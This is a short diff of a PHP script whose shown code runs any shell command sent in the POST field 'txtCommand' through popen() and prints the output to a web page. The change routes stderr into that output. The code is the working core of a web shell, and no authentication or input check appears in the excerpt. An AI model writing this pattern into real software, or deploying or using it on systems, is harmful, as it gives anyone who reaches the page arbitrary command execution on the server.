@@ -230,7 +230,7 @@ if (!isBlank($_POST['txtCommand'])) {
    puts("\$ " . htmlspecialchars($_POST['txtCommand']));
    putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin");
    putenv("SCRIPT_FILENAME=" . strtok($_POST['txtCommand'], " "));	/* PHP scripts */
-   $ph = popen($_POST['txtCommand'], "r" );
+   $ph = popen($_POST['txtCommand'] . ' 2>&1', "r" );
    while ($line = fgets($ph)) echo htmlspecialchars($line);
    pclose($ph);
    puts("</pre>");
